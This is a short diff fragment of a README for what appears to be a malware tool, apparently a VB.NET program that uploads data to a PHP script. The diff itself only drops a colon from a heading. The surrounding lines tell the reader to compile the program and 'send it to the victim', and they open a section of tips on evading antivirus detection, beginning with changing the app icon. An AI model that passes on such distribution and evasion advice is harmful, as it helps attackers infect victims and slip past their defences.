@@ -50,7 +50,7 @@ Dim php As String = "yourphpfilename.php?" & "folder="
 ```
  - Just compile it and send it to the victim thats all !!
  
- ## Million Dollar Advice ;):
+ ## Million Dollar Advice ;)
  To Avoid Antivirus Detection
  
  - Change the app icon
